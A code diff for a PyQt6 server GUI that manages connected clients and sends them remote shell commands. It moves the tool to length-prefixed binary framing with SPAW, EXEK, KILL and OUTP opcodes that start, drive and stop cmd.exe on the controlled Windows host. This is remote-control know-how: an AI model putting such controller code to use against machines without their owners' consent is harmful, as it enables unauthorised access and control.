@@ -6,6 +6,8 @@ from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QH
                              QLabel, QLineEdit, QPushButton, QListView, QTextEdit, QDialog,
                              QMenu, QAbstractItemView)
 from PyQt6.QtCore import Qt, QAbstractListModel, QVariant, QModelIndex, pyqtSignal
+import struct
+
 
 class ClientSession:
     def __init__(self, conn: socket.socket, addr):
@@ -16,11 +18,16 @@ class ClientSession:
         self.connected = True
         self._recv_buf = bytearray()
 
-    def send_raw(self, data: bytes) -> bool:
+    # 发送完整数据包：封装4字节大端长度头
+    def send_packet(self, body: bytes) -> bool:
         if not self.connected:
             return False
         try:
-            self.conn.sendall(data)
+            body_len = len(body)
+            # 4字节大端长度
+            header = struct.pack(">I", body_len)
+            packet = header + body
+            self.conn.sendall(packet)
             return True
         except (OSError, BrokenPipeError):
             self.close()
@@ -33,8 +40,10 @@ class ClientSession:
         except Exception:
             pass
 
+
 class RemoteCmdDialog(QDialog):
     append_output = pyqtSignal(str)
+
     def __init__(self, client_session: ClientSession, parent=None):
         super().__init__(parent)
         self.setWindowTitle(f"远程CMD - {client_session.ip_str}")
@@ -49,13 +58,15 @@ class RemoteCmdDialog(QDialog):
 
         input_lay = QHBoxLayout()
         self.cmd_input = QLineEdit()
-        self.cmd_input.setPlaceholderText("输入命令回车执行，cd不会持久生效")
+        self.cmd_input.setPlaceholderText("输入命令回车执行")
         self.cmd_input.returnPressed.connect(self.on_enter_command)
         input_lay.addWidget(self.cmd_input)
         lay.addLayout(input_lay)
 
         self.append_output.connect(self.out_box.append)
-        self.append_output.emit(f"==== 连接 {self.client.ip_str} 远程CMD ====\n每条命令独立进程")
+        self.append_output.emit(f"==== 连接 {self.client.ip_str} 远程CMD ====\n[*] 已发送SPAW启动被控端cmd.exe")
+        # 对话框打开时发送 SPAW 启动cmd
+        self.client.send_packet(b"SPAW")
 
     def on_enter_command(self):
         cmd = self.cmd_input.text().strip()
@@ -63,8 +74,9 @@ class RemoteCmdDialog(QDialog):
         if not self.is_alive or not self.client.connected:
             self.append_output.emit("\n[!] 连接断开")
             return
-        payload = f"CMD|{cmd}\n".encode("utf-8")
-        ok = self.client.send_raw(payload)
+        # EXEK + 命令字符串
+        payload = b"EXEK" + cmd.encode("gbk", errors="replace")
+        ok = self.client.send_packet(payload)
         self.append_output.emit(f"> {cmd}")
         if not ok:
             self.append_output.emit("[发送失败]")
@@ -74,8 +86,12 @@ class RemoteCmdDialog(QDialog):
 
     def closeEvent(self, event):
         self.is_alive = False
-        self.append_output.emit("\n[*] 关闭本地CMD窗口；长耗时命令会继续在被控端执行直至超时(30s)")
+        # 关闭对话框发送 KILL，终止被控端cmd进程
+        if self.client.connected:
+            self.client.send_packet(b"KILL")
+        self.append_output.emit("\n[*] 已发送KILL；被控端cmd进程已终止")
         super().closeEvent(event)
+
 
 class ClientListModel(QAbstractListModel):
     def __init__(self):
@@ -101,6 +117,7 @@ class ClientListModel(QAbstractListModel):
         self.beginRemoveRows(QModelIndex(), idx, idx)
         self.items.pop(idx)
         self.endRemoveRows()
+
 
 class MainWindow(QMainWindow):
     def __init__(self):
@@ -163,25 +180,37 @@ class MainWindow(QMainWindow):
                 if not chunk:
                     break
                 buf.extend(chunk)
-                while b'\n' in buf:
-                    line, buf = buf.split(b'\n', 1)
-                    line = line.strip()
-                    if not line:
-                        continue
-                    parts = line.split(b'|', 1)
-                    if len(parts) != 2:
-                        if line == b"PONG":
+
+                # 二进制帧解析循环：4字节大端header + body
+                while len(buf) >= 4:
+                    # 读取4字节长度头
+                    body_len = struct.unpack(">I", buf[0:4])[0]
+                    total_packet_len = 4 + body_len
+                    if len(buf) < total_packet_len:
+                        break  # 包没收齐，等待下一次recv
+
+                    # 取出完整包
+                    body = buf[4:total_packet_len]
+                    # 消费缓冲区
+                    del buf[:total_packet_len]
+
+                    # 解析body
+                    if len(body)>=4:
+                        cmd_code = body[0:4]
+                        if cmd_code == b"PONG":
                             sess.last_pong = datetime.now()
                             self.client_model.dataChanged.emit(QModelIndex(), QModelIndex())
-                        continue
-                    typ, payload = parts
-                    if typ == b"CMDOUT":
-                        out_text = payload.decode("utf-8", errors="replace")
-                        if sess in self.open_cmd_dialogs:
-                            dlg = self.open_cmd_dialogs[sess]
-                            dlg.slot_recv_output(out_text)
+                        elif cmd_code == b"OUTP":
+                            output_bytes = body[4:]
+                            # windows cmd输出GBK编码
+                            out_text = output_bytes.decode("gbk", errors="replace")
+                            if sess in self.open_cmd_dialogs:
+                                dlg = self.open_cmd_dialogs[sess]
+                                dlg.slot_recv_output(out_text)
+
             except OSError:
                 break
+
         sess.close()
         if sess in self.open_cmd_dialogs:
             dlg = self.open_cmd_dialogs.pop(sess)
@@ -235,6 +264,7 @@ class MainWindow(QMainWindow):
     def closeEvent(self, event):
         self.stop_server()
         event.accept()
+
 
 if __name__ == "__main__":
     app = QApplication(sys.argv)
